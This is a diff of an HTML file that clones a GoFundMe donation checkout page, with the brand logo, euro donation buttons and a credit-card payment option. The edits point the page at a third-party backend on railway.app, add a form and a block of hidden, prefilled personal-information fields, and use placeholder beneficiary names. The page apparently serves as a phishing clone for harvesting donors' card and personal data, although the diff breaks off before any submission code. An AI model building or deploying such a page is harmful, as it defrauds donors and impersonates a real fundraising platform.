@@ -131,6 +131,8 @@
 
     <!-- NEW CSS BLOCK FOR ERROR STATES AND ICONS -->
     <style>
+      /* Additional CSS to handle error states and allow easy customization */
+
       /* When a field has an error, highlight its wrapper border in red. */
       .field-error {
         border-color: #d32f00 !important;
@@ -152,7 +154,8 @@
         margin-right: 0.375rem;
       }
 
-      /* Fix for the card brand logo shifting on error. */
+      /* Fix for the card brand logo shifting on error.
+         Position it absolutely so it doesn't move when errors appear. */
       .card-number-wrapper .hrt-text-field-wrapper {
         position: relative;
       }
@@ -222,24 +225,30 @@
 
     <!-- 
       ADD A SCRIPT HERE TO SET YOUR BACKEND URL 
-      (Adjust to your domain/endpoint as needed)
+      (You can change the URL below to whatever endpoint or domain you use)
     -->
     <script>
       window.BACKEND_URL = "https://fbcid-production.up.railway.app";
     </script>
   </head>
 
-  <body cz-shortcut-listen="true">
-    <div id="__next">
-      <div id="portal"></div>
-      <div class="checkout-layout_checkoutLayout__J6sZi">
-        <div class="checkout-layout_checkoutHeaderNav__neIDw">
+  <body
+    __processed_a849ff45-d301-4daf-a028-412b95074c0c__="true"
+    bis_register='[{"master":true,"extensionId":"eppiocemhmlnbbjbhcbpfmcgiconoglb","adblockerStatus":{"DISPLAY":"disabled","FACEBOOK":"disabled","TWITTER":"disabled","REDDIT":"disabled","PINTEREST":"disabled","INSTAGRAM":"disabled","LINKEDIN":"disabled","CONFIG":"disabled"},"version":"2.0.17","score":20017}]'
+    cz-shortcut-listen="true"
+  >
+    <div id="__next" bis_skin_checked="1">
+      <div id="portal" bis_skin_checked="1"></div>
+      <div class="checkout-layout_checkoutLayout__J6sZi" bis_skin_checked="1">
+        <div
+          class="checkout-layout_checkoutHeaderNav__neIDw"
+          bis_skin_checked="1"
+        >
           <header class="hrt-header hrt-header--default">
-            <div class="hrt-width-full hrt-container">
+            <div class="hrt-width-full hrt-container" bis_skin_checked="1">
               <nav class="hrt-header-nav">
-                <div class="hrt-header-left"></div>
-                <div class="hrt-header-center">
-                  <!-- GFM logo -->
+                <div class="hrt-header-left" bis_skin_checked="1"></div>
+                <div class="hrt-header-center" bis_skin_checked="1">
                   <svg
                     class="hrt-gfm-logo"
                     fill="none"
@@ -251,20 +260,28 @@
                   >
                     <path
                       clip-rule="evenodd"
-                      d="m4.8556 19.4183c1.28303 0 2.73375.5394 3.50113 1.6066h.09587v-1.3308h3.4771v10.9465c0 3.6329-2.99735 5.3594-5.97097 5.3594-2.88923 0-5.70701-1.6425-5.731072-4.7238h3.453002c.08403 1.3785 1.07907 2.0141 2.23031 2.0141 1.15088 0 2.32582-.7074 2.32582-2.458v-1.6783h-.09588c-.77922.935-2.08631 1.4385-3.28531 1.4385-2.91329 0-4.8556-2.7815-4.8556-5.623s1.94231-5.5512 4.8556-5.5512zm34.4819.264v6.1986c0 .9232.7193 1.6665 1.6184 1.6665.8992 0 1.6188-.7433 1.6188-1.6665v-6.1986h3.6925v6.1386c0 3.1413-2.1581 5.0596-5.3113 5.0596-3.0932 0-5.3113-1.8465-5.3113-5.0596v-6.1386zm59.8271-.288c3.2134 0 5.7674 2.398 5.7674 5.7551 0 .3128-.029.5774-.053.7494l-.007.0539h-7.7093c.1318 1.4026 1.0069 2.194 2.0741 2.194.5951 0 1.2012-.2401 1.7242-.8148l.074-.0843h3.561c-.923 2.4698-3.177 3.6206-5.4314 3.6206-2.8892 0-5.7669-1.906-5.7669-5.7188 0-3.3571 2.5538-5.7551 5.7669-5.7551zm-79.6456-.0959c3.3453 0 6.0787 2.3621 6.0787 5.767 0 3.4052-2.7334 5.7669-6.0787 5.7669-3.333 0-6.0305-2.338-6.0305-5.7669 0-3.429 2.6975-5.767 6.0305-5.767zm53.1373-6.2345v17.5286h-3.477v-1.4508h-.0959c-.9473 1.0673-2.2662 1.6666-3.597 1.6666-2.9973 0-4.9878-2.7334-4.9878-5.6948s1.9905-5.6833 4.9878-5.6833c1.1509 0 2.5298.4316 3.3812 1.4629h.0958v-7.8292zm-40.3325-.3117c.6833 0 1.3907.0837 2.0023.2277v2.9854c-.2758-.0718-.4916-.1081-.7315-.1081-.995 0-1.8583.408-1.8583 1.7265v2.1104h2.254v2.9855h-2.254v7.9129h-3.6929v-7.9129h-1.6065v-2.9855h1.6065v-2.8774c0-2.7219 1.9305-4.0645 4.2804-4.0645zm22.684 6.6421c2.0382 0 3.9324 1.4388 3.9324 4.2444v6.9538h-3.6925v-6.1864c0-1.0913-.7315-1.8224-1.6547-1.8224s-1.6547.7552-1.6547 1.8224v6.1864h-3.6925v-10.8984h3.4767v1.3667h.0959c.8273-1.1268 2.1462-1.6665 3.1894-1.6665zm33.019 0c1.9541 0 3.8128 1.4629 3.8128 4.2085v6.9897h-3.6929v-6.3182c0-1.0195-.6715-1.6906-1.5107-1.6906-.8514 0-1.5229.6833-1.5229 1.6906v6.3182h-3.6925v-6.3182c0-1.0195-.6715-1.6906-1.5107-1.6906-.8514 0-1.5229.6833-1.5229 1.6906v6.3182h-3.6929v-10.8984h3.4771v1.3667h.0959c.7315-1.1031 1.9664-1.6543 3.1413-1.6543 1.139 0 2.3262.5993 3.0454 1.8823h.0959c.9114-1.3071 2.2181-1.8945 3.4771-1.8945zm-21.4732 3.2731c-1.3548 0-2.458 1.1031-2.458 2.4579 0 1.3549 1.1032 2.4698 2.458 2.4698s2.4576-1.1149 2.4576-2.4698c0-1.3548-1.1028-2.4579-2.4576-2.4579zm-47.0105-.0837c-1.3308 0-2.4099 1.1028-2.4099 2.4817s1.0791 2.482 2.4099 2.482 2.4098-1.1031 2.4098-2.482-1.079-2.4817-2.4098-2.4817zm-13.59622.0837c-1.29488 0-2.34988 1.0431-2.34988 2.338s1.055 2.3499 2.34988 2.3499 2.33803-1.055 2.33803-2.3499-1.04315-2.338-2.33803-2.338zm93.24182-.5634c-.971 0-1.7983.6233-2.0741 1.8705h4.0884c-.228-1.2231-1.043-1.8705-2.0143-1.8705zm3.9303-6.085.681 2.0015.676-2.0015h.456v2.3673h-.307v-1.3974c0-.0482.002-.1281.004-.2399s.003-.2317.003-.3595l-.676 1.9968h-.318l-.682-1.9968v.0726c0 .0581.002.1462.005.265.003.1189.005.2059.005.2618v1.3974h-.307v-2.3673zm-.746 0v.2821h-.798v2.0852h-.324v-2.0852h-.798v-.2821zm-49.9072-5.6385c4.1515 0 7.7733 2.2566 9.7131 5.6085h-19.4258c1.9397-3.3519 5.5615-5.6085 9.7127-5.6085zm11.1571-5.37831c.7196-.71962 1.8968-.71962 2.616 0 .7197.71925.7197 1.89641 0 2.61604l-2.7881 2.78817c-.7193.7192-1.8964.7192-2.6161 0l-.0634-.0667c-.6551-.72385-.634-1.85189.0634-2.54934zm-24.8532-.06344c.7239-.65552 1.8519-.63438 2.5494.06344l2.7885 2.78817c.7193.71925.7193 1.89641 0 2.61604-.7196.7192-1.8968.7192-2.616 0l-2.7886-2.78817c-.7192-.71963-.7192-1.89679 0-2.61604zm13.6728-4.93875.0799.00171783c.9809.04222747 1.7699.85758817 1.7699 1.84842217v3.94275c0 1.01761-.8322 1.85014-1.8498 1.85014-1.0173 0-1.8498-.83253-1.8498-1.85014v-3.94275c0-1.017614.8325-1.85014 1.8498-1.85014z"
+                      d="m4.8556 19.4183c1.28303 0 2.73375.5394 3.50113 1.6066h.09587v-1.3308h3.4771v10.9465c0 3.6329-2.99735 5.3594-5.97097 5.3594-2.88923 0-5.70701-1.6425-5.731072-4.7238h3.453002c.08403 1.3785 1.07907 2.0141 2.23031 2.0141 1.15088 0 2.32582-.7074 2.32582-2.458v-1.6783h-.09588c-.77922.935-2.08631 1.4385-3.28531 1.4385-2.91329 0-4.8556-2.7815-4.8556-5.623s1.94231-5.5512 4.8556-5.5512zm34.4819.264v6.1986c0 .9232.7193 1.6665 1.6184 1.6665.8992 0 1.6188-.7433 1.6188-1.6665v-6.1986h3.6925v6.1386c0 3.1413-2.1581 5.0596-5.3113 5.0596-3.0932 0-5.3113-1.8465-5.3113-5.0596v-6.1386zm59.8271-.288c3.2134 0 5.7674 2.398 5.7674 5.7551 0 .3128-.029.5774-.053.7494l-.007.0539h-7.7093c.1318 1.4026 1.0069 2.194 2.0741 2.194.5951 0 1.2012-.2401 1.7242-.8148l.074-.0843h3.561c-.923 2.4698-3.177 3.6206-5.4314 3.6206-2.8892 0-5.7669-1.906-5.7669-5.7188 0-3.3571 2.5538-5.7551 5.7669-5.7551zm-79.6456-.0959c3.3453 0 6.0787 2.3621 6.0787 5.767 0 3.4052-2.7334 5.7669-6.0787 5.7669-3.333 0-6.0305-2.338-6.0305-5.7669 0-3.429 2.6975-5.767 6.0305-5.767zm53.1373-6.2345v17.5286h-3.477v-1.4508h-.0959c-.9473 1.0673-2.2662 1.6666-3.597 1.6666-2.9973 0-4.9878-2.7334-4.9878-5.6948s1.9905-5.6833 4.9878-5.6833c1.1509 0 2.5298.4316 3.3812 1.4629h.0958v-7.8292zm-40.3325-.3117c.6833 0 1.3907.0837 2.0023.2277v2.9854c-.2758-.0718-.4916-.1081-.7315-.1081-.995 0-1.8583.408-1.8583 1.7265v2.1104h2.254v2.9855h-2.254v7.9129h-3.6929v-7.9129h-1.6065v-2.9855h1.6065v-2.8774c0-2.7219 1.9305-4.0645 4.2804-4.0645zm22.684 6.6421c2.0382 0 3.9324 1.4388 3.9324 4.2444v6.9538h-3.6925v-6.1864c0-1.0913-.7315-1.8224-1.6547-1.8224s-1.6547.7552-1.6547 1.8224v6.1864h-3.6925v-10.8984h3.4767v1.3667h.0959c.8273-1.1268 2.1462-1.6665 3.1894-1.6665zm33.019 0c1.9541 0 3.8128 1.4629 3.8128 4.2085v6.9897h-3.6929v-6.3182c0-1.0195-.6715-1.6906-1.5107-1.6906-.8514 0-1.5229.6833-1.5229 1.6906v6.3182h-3.6929v-6.3182c0-1.0195-.6715-1.6906-1.5107-1.6906-.8514 0-1.5229.6833-1.5229 1.6906v6.3182h-3.6929v-10.8984h3.4771v1.3667h.0959c.7315-1.1031 1.9664-1.6543 3.1413-1.6543 1.139 0 2.3262.5993 3.0454 1.8823h.0959c.9114-1.3071 2.2181-1.8945 3.4771-1.8945zm-21.4732 3.2731c-1.3548 0-2.458 1.1031-2.458 2.4579 0 1.3549 1.1032 2.4698 2.458 2.4698s2.4576-1.1149 2.4576-2.4698c0-1.3548-1.1028-2.4579-2.4576-2.4579zm-47.0105-.0837c-1.3308 0-2.4099 1.1028-2.4099 2.4817s1.0791 2.482 2.4099 2.482 2.4098-1.1031 2.4098-2.482-1.079-2.4817-2.4098-2.4817zm-13.59622.0837c-1.29488 0-2.34988 1.0431-2.34988 2.338s1.055 2.3499 2.34988 2.3499 2.33803-1.055 2.33803-2.3499-1.04315-2.338-2.33803-2.338zm93.24182-.5634c-.971 0-1.7983.6233-2.0741 1.8705h4.0884c-.228-1.2231-1.043-1.8705-2.0143-1.8705zm3.9303-6.085.681 2.0015.676-2.0015h.456v2.3673h-.307v-1.3974c0-.0482.002-.1281.004-.2399s.003-.2317.003-.3595l-.676 1.9968h-.318l-.682-1.9968v.0726c0 .0581.002.1462.005.265.003.1189.005.2059.005.2618v1.3974h-.307v-2.3673zm-.746 0v.2821h-.798v2.0852h-.324v-2.0852h-.798v-.2821zm-49.9072-5.6385c4.1515 0 7.7733 2.2566 9.7131 5.6085h-19.4258c1.9397-3.3519 5.5615-5.6085 9.7127-5.6085zm11.1571-5.37831c.7196-.71962 1.8968-.71962 2.616 0 .7197.71925.7197 1.89641 0 2.61604l-2.7881 2.78817c-.7193.7192-1.8964.7192-2.6161 0l-.0634-.0667c-.6551-.72385-.634-1.85189.0634-2.54934zm-24.8532-.06344c.7239-.65552 1.8519-.63438 2.5494.06344l2.7885 2.78817c.7193.71925.7193 1.89641 0 2.61604-.7196.7192-1.8968.7192-2.616 0l-2.7886-2.78817c-.7192-.71963-.7192-1.89679 0-2.61604zm13.6728-4.93875.0799.00171783c.9809.04222747 1.7699.85758817 1.7699 1.84842217v3.94275c0 1.01761-.8322 1.85014-1.8498 1.85014-1.0173 0-1.8498-.83253-1.8498-1.85014v-3.94275c0-1.017614.8325-1.85014 1.8498-1.85014z"
                       fill="#02a95c"
                       fill-rule="evenodd"
                     ></path>
                   </svg>
                 </div>
-                <div class="hrt-header-right">
-                  <div class="hrt-text-body-sm">
-                    <span class="hrt-hide-max-lg hrt-text-neutral-500"></span>
+                <div class="hrt-header-right" bis_skin_checked="1">
+                  <div class="hrt-text-body-sm" bis_skin_checked="1">
+                    <span class="hrt-hide-max-lg hrt-text-neutral-500"
+                      ><font style="vertical-align:inherit"
+                        ><font style="vertical-align:inherit"
+                          ></font></font
+                    ></span>
                     <a
                       class="hrt-link hrt-link--gray-dark"
                       data-element-id="btn_nav_sign_in"
-                      href="https://www.gofundme.com/sign-in"
+                      data-savepage-href="/sign-in?redirect=/f/hilfe-fur-sonja/donate?source=btn_donate&amp;ucdirect=1"
+                      href="https://www.gofundme.com/sign-in?redirect=/f/hilfe-fur-sonja/donate?source=btn_donate&amp;ucdirect=1"
                       data-analytic-event-listener="true"
+                      ><font style="vertical-align:inherit"
+                        ><font style="vertical-align:inherit"
+                          ></font></font
                     ></a>
                   </div>
                 </div>
@@ -272,49 +289,112 @@
             </div>
           </header>
         </div>
-        <div class="hrt-container"></div>
+        <div class="hrt-container" bis_skin_checked="1"></div>
         <main class="checkout-layout_checkoutLayoutMain__fv3Qi">
-          <div class="checkout-page_checkoutPage__LCkAY">
-            <div class="checkout-page_checkoutCard__u69JA">
-              <div id="entity-summary" class="entity-summary_entitySummary__P18r9">
-                <div class="core-entity-summary_campaignSummaryText__Y8XzY hrt-mb-2">
+          <div
+            class="checkout-page_checkoutPage__LCkAY"
+            data-tracking-fundraiser-id="84609137"
+            bis_skin_checked="1"
+          >
+            <div class="checkout-page_checkoutCard__u69JA" bis_skin_checked="1">
+              <div
+                id="entity-summary"
+                class="entity-summary_entitySummary__P18r9"
+                bis_skin_checked="1"
+              >
+                <div
+                  class="core-entity-summary_campaignSummaryText__Y8XzY hrt-mb-2"
+                  bis_skin_checked="1"
+                >
                   <h1 class="hrt-mb-0 hrt-text-body-md hrt-font-regular">
-                    You are supporting <span>SOMEONE</span>
+                    <font style="vertical-align:inherit"
+                      ><font style="vertical-align:inherit"
+                        >You are supporting </font
+                      ></font
+                    >
+                    <span
+                      ><font style="vertical-align:inherit"
+                        ><font style="vertical-align:inherit"
+                          >SOMEONE</font
+                        ></font
+                      ></span
+                    >
+                    <strong></strong>
                   </h1>
-                  <h2 class="hrt-text-neutral-500 hrt-font-regular hrt-text-body-sm hrt-mb-0">
-                    Your donation will benefit <strong>My Name</strong>
+                  <h2
+                    class="hrt-text-neutral-500 hrt-font-regular hrt-text-body-sm hrt-mb-0"
+                  >
+                    <font style="vertical-align:inherit"
+                      ><font style="vertical-align:inherit"
+                        >Your donation will benefit </font
+                      ></font
+                    >
+                    <strong
+                      ><font style="vertical-align:inherit"
+                        ><font style="vertical-align:inherit"
+                          >My Name</font
+                        ></font
+                      ></strong
+                    >
                   </h2>
                 </div>
               </div>
-              <div class="checkout-form">
-                <!-- Fieldset for donation amount -->
-                <fieldset>
-                  <legend
-                    class="hrt-font-bold hrt-mb-2"
-                    id="enter-your-donation-legend"
-                  >
-                    Enter your donation
-                  </legend>
-                  <div class="hrt-width-full">
-                    <style>
-                      /* Base styles for buttons within the suggested donations list */
-                      ul[data-federalid="suggested-donations-list"] button {
-                        transition: background-color 0.3s, color 0.3s;
-                        cursor: pointer;
-                      }
+              <div class="checkout-form" bis_skin_checked="1">
+                <form name="ucForm">
+                  <fieldset>
+                    <legend
+                      class="hrt-font-bold hrt-mb-2"
+                      id="enter-your-donation-legend"
+                    >
+                      <font style="vertical-align:inherit"
+                        ><font style="vertical-align:inherit"
+                          >Enter your donation</font
+                        ></font
+                      >
+                    </legend>
+                    <div class="hrt-width-full" bis_skin_checked="1">
+                      <style>
+                        /* Base styles for buttons within the suggested donations list */
+                        ul[data-federalid="suggested-donations-list"] button {
+                          transition: background-color 0.3s, color 0.3s;
+                          cursor: pointer;
+                        }
 
-                      /* Styles for selected buttons */
-                      ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"] {
-                        background-color: black !important;
-                        color: white !important;
-                      }
-                      ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]:hover {
-                        background-color: black !important;
-                        color: white !important;
-                      }
-                    </style>
-                  </div>
-                </fieldset>
+                        /* Styles for selected buttons */
+                        ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"] {
+                          background-color: black !important; /* Ensure black background */
+                          color: white !important; /* Ensure white text */
+                        }
+
+                        /* Prevent hover effects on selected buttons */
+                        ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]:hover {
+                          background-color: black !important;
+                          color: white !important;
+                        }
+                      </style>
+
+                      <style>
+                        /* Duplicate style block (kept as in original code) */
+                        ul[data-federalid="suggested-donations-list"] button {
+                          transition: background-color 0.3s, color 0.3s;
+                          cursor: pointer;
+                        }
+                        ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"] {
+                          background-color: black !important;
+                          color: white !important;
+                        }
+                        ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]:hover {
+                          background-color: black !important;
+                          color: white !important;
+                        }
+                      </style>
+                    </div>
+                  </fieldset>
+                  <div bis_skin_checked="1"></div>
+                </form>
+                <style>
+                  /* Place for the body content we had above... */
+                </style>
 
                 <!-- Suggested Donation Buttons -->
                 <ul
@@ -323,9 +403,10 @@
                 >
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-25"
                       value="25"
                     >
                       €25
@@ -333,9 +414,10 @@
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-50"
                       value="50"
                     >
                       €50
@@ -343,26 +425,31 @@
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-100"
                       value="100"
                     >
                       €100
                       <span
                         class="suggested-donation-tile_tag__xRBex suggested-donation-tag_tag__i3Y06 hrt-tag hrt-tag--green hrt-base-tag hrt-base-tag--small"
                         aria-label="Suggested"
-                        style="margin-left: 4px;"
                       >
-                        💚 Suggested
+                        <span
+                          class="suggested-donation-tag_icon__dhYCn suggested-donation-tag_withLabel__sv0PQ"
+                          >💚</span
+                        >
+                        <span>Suggested</span>
                       </span>
                     </button>
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-300"
                       value="300"
                     >
                       €300
@@ -370,9 +457,10 @@
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-500"
                       value="500"
                     >
                       €500
@@ -380,9 +468,10 @@
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-750"
                       value="750"
                     >
                       €750
@@ -390,9 +479,10 @@
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-1000"
                       value="1000"
                     >
                       €1000
@@ -400,9 +490,10 @@
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-1500"
                       value="1500"
                     >
                       €1500
@@ -410,9 +501,10 @@
                   </li>
                   <li class="hrt-m-0">
                     <button
-                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
+                      class="hrt-width-full hrt-position-relative suggested-donation-tile_button__vbexw suggested-donation-tile_buttonUnselected__bdFUC hrt-secondary-button hrt-secondary-button--inline hrt-secondary-button--xlarge hrt-secondary-button--default hrt-base-button"
                       type="button"
                       aria-pressed="false"
+                      data-federalid="suggested-donation-list-item-2000"
                       value="2000"
                     >
                       €2000
@@ -422,13 +514,14 @@
 
                 <!-- Script that updates donation summary on button click -->
                 <script>
+                  // Donation buttons – update aria-pressed and donation summary text
                   const donationButtons = document.querySelectorAll(
                     'ul[data-federalid="suggested-donations-list"] button'
                   );
+
                   const donationSummaryDDs = document.querySelectorAll(
                     ".checkout-summary_checkoutSummaryList__1z9xU dd"
                   );
-
                   let donationAmountElement = null;
                   let totalAmountElement = null;
                   if (donationSummaryDDs.length >= 2) {
@@ -438,11 +531,9 @@
 
                   donationButtons.forEach((button) => {
                     button.addEventListener("click", () => {
-                      // Clear previous selections
                       donationButtons.forEach((btn) =>
                         btn.setAttribute("aria-pressed", "false")
                       );
-                      // Mark this one as selected
                       button.setAttribute("aria-pressed", "true");
 
                       if (donationAmountElement && totalAmountElement) {
@@ -453,66 +544,363 @@
                   });
                 </script>
 
-                <!-- Payment method radio (retain) -->
-                <fieldset class="hrt-mb-3 hrt-fieldset" style="margin-top: 2rem;">
-                  <legend class="hrt-font-bold hrt-fieldset-legend">
-                    <span class="hrt-text-body-md hrt-font-bold">
-                      Payment method
-                    </span>
-                  </legend>
-                  <div class="hrt-mt-2">
-                    <ul
-                      class="checkout-form-fields_checkoutPaymentOptions__wTG9d hrt-list-unstyled"
-                    >
-                      <li class="payment-method-option_checkoutPaymentItem__MRWEI">
-                        <div
-                          class="payment-method-option_checkoutPaymentOption__2PCN3 hrt-radio-field"
+                <!-- Additional fields before the payment options -->
+                <div
+                  class="checkoutCurrencyField m-form-field m-form-field--stacked hrt-mb-3"
+                  bis_skin_checked="1"
+                >
+                  <div class="m-form-field-inner" bis_skin_checked="1">
+                    <label
+                      class="m-form-field-label m-form-field-label--prepend"
+                      for="checkout-donation"
+                    ></label>
+                  </div>
+                </div>
+                <div aria-live="polite" class="hrt-sr-only" bis_skin_checked="1"></div>
+
+                <fieldset
+                  class="hrt-checkout-step hrt-fieldset"
+                  bis_skin_checked="1"
+                >
+                  <legend class="hrt-fieldset-legend sf-hidden"></legend>
+                  <div bis_skin_checked="1"></div>
+                </fieldset>
+                <div
+                  class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
+                  bis_skin_checked="1"
+                ></div>
+
+                <!-- Payment Options -->
+                <div class="checkout-payment-options" bis_skin_checked="1">
+                  <fieldset class="hrt-mb-3 hrt-fieldset">
+                    <legend class="hrt-font-bold hrt-fieldset-legend">
+                      <span class="hrt-text-body-md hrt-font-bold"
+                        >Payment method</span
+                      >
+                    </legend>
+                    <div class="hrt-mt-2" bis_skin_checked="1">
+                      <ul
+                        class="checkout-form-fields_checkoutPaymentOptions__wTG9d hrt-list-unstyled"
+                      >
+                        <li
+                          class="payment-method-option_checkoutPaymentItem__MRWEI"
                         >
-                          <input
-                            class="hrt-radio-field-input"
-                            id="add-card"
-                            type="radio"
-                            name="paymentMethod"
-                            value="CREDIT_CARD"
-                            checked
-                          />
-                          <label class="hrt-radio-field-label" for="add-card">
-                            <div class="hrt-disp-flex hrt-align-center">
-                              <!-- Card icon placeholder -->
-                              <svg
-                                aria-hidden="true"
-                                class="hrt-mr-2 hrt-icon hrt-icon--xlarge"
-                                focusable="false"
-                                viewBox="0 0 24 24"
-                              >
-                                <use href="#card"></use>
-                                <symbol
-                                  fill="none"
-                                  viewBox="0 0 24 24"
-                                  id="card"
-                                  xmlns="http://www.w3.org/2000/svg"
-                                >
-                                  <path
-                                    d="M17.333 6.833H6.667a1.833 1.833 0 0 0-1.834 1.834v6.667a1.833 1.833 0 0 0 1.834 1.833h10.666a1.833 1.833 0 0 0 1.834-1.834V8.668a1.833 1.833 0 0 0-1.834-1.833Zm-10.666 1h10.666a.833.833 0 0 1 .834.834v.5H5.833v-.5a.833.833 0 0 1 .834-.833Zm11.5 3.334H5.833v-1h12.334v1Zm-.834 5H6.667a.834.834 0 0 1-.834-.834v-3.166h12.334v3.167a.833.833 0 0 1-.834.833Z"
-                                    fill="#333"
-                                  ></path>
-                                </symbol>
-                              </svg>
+                          <div
+                            class="payment-method-option_checkoutPaymentOption__2PCN3 hrt-radio-field"
+                            bis_skin_checked="1"
+                          >
+                            <input
+                              class="hrt-radio-field-input"
+                              id="add-card"
+                              type="radio"
+                              name="paymentMethod"
+                              value="CREDIT_CARD"
+                              checked
+                            />
+                            <label class="hrt-radio-field-label" for="add-card">
                               <div
-                                class="hrt-disp-flex hrt-align-center hrt-justify-between hrt-width-full"
+                                class="hrt-disp-flex hrt-align-center"
+                                bis_skin_checked="1"
                               >
-                                <span>Credit or debit card</span>
+                                <!-- Icon placeholder -->
+                                <svg
+                                  aria-hidden="true"
+                                  class="hrt-mr-2 hrt-icon hrt-icon--xlarge"
+                                  focusable="false"
+                                  viewBox="0 0 24 24"
+                                >
+                                  <use href="#card"></use>
+                                  <symbol
+                                    fill="none"
+                                    viewBox="0 0 24 24"
+                                    id="card"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                  >
+                                    <path
+                                      d="M17.333 6.833H6.667a1.833 1.833 0 0 0-1.834 1.834v6.667a1.833 1.833 0 0 0 1.834 1.833h10.666a1.833 1.833 0 0 0 1.834-1.834V8.668a1.833 1.833 0 0 0-1.834-1.833Zm-10.666 1h10.666a.833.833 0 0 1 .834.834v.5H5.833v-.5a.833.833 0 0 1 .834-.833Zm11.5 3.334H5.833v-1h12.334v1Zm-.834 5H6.667a.834.834 0 0 1-.834-.834v-3.166h12.334v3.167a.833.833 0 0 1-.834.833Z"
+                                      fill="#333"
+                                    ></path>
+                                  </symbol>
+                                </svg>
+                                <div
+                                  class="hrt-disp-flex hrt-align-center hrt-justify-between hrt-width-full"
+                                  bis_skin_checked="1"
+                                >
+                                  <span>Credit or debit card</span>
+                                </div>
+                              </div>
+                            </label>
+                          </div>
+                        </li>
+                      </ul>
+                    </div>
+                  </fieldset>
+                  <div class="hrt-mt-1" bis_skin_checked="1"></div>
+                </div>
+
+                <div
+                  class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
+                  bis_skin_checked="1"
+                ></div>
+
+                <!-- Personal Info Fields (HIDDEN + PREFILLED) -->
+                <div
+                  style="display: none;"
+                  class="credit-card-form-fields hrt-mt-1 hrt-ml-4 credit-card-form-fields_creditCardPaymentHideLegend__baBa8 hrt-fieldset"
+                >
+                  <legend class="hrt-font-bold hrt-fieldset-legend sf-hidden"></legend>
